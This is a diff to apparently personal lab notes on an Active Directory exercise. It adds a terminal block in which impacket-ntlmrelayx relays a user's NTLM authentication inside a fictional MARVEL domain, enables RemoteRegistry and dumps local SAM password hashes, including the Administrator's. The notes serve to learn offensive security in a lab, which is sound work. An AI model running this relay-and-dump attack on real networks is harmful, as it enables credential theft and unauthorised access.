@@ -123,8 +123,50 @@ Execute the smb
 
 ![[Pasted image 20240714210802.png]]
 
-We cant access but we captured the logs in kali
+We can't access smb but we captured the logs and has in kali
 
 ![[Pasted image 20240714222330.png]]
 
+```
+┌──(kali㉿kali)-[~]
+└─$ impacket-ntlmrelayx -tf targets.txt -smb2support
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client SMTP loaded..
+[*] Running in relay mode to hosts in targetfile
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+[*] Received connection from MARVEL/fcastle at PUNISHER, connection will be relayed after re-authentication
+[*] SMBD-Thread-5 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.64.220 controlled, attacking target smb://192.168.64.220
+[*] Authenticating against smb://192.168.64.221 as MARVEL/FCASTLE SUCCEED
+[*] SMBD-Thread-6 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.64.220 controlled, attacking target smb://192.168.64.220
+[*] Service RemoteRegistry is in stopped state
+[*] Service RemoteRegistry is disabled, enabling it
+[*] Starting service RemoteRegistry
+[-] Authenticating against smb://192.168.64.220 as MARVEL/FCASTLE FAILED
+[*] Target system bootKey: 0xcabc660ecd3b48764bce94bc0b8bf0be
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e7ec10dcc923609de4e827dd59da5683:::
+peterparker:1001:aad3b435b51404eeaad3b435b51404ee:dceeee34db21ea54de36c6a0b88c9843:::
+[*] Done dumping SAM hashes for host: 192.168.64.221
+[*] Stopping service RemoteRegistry
+[*] Restoring the disabled state for service RemoteRegistry
+
+```
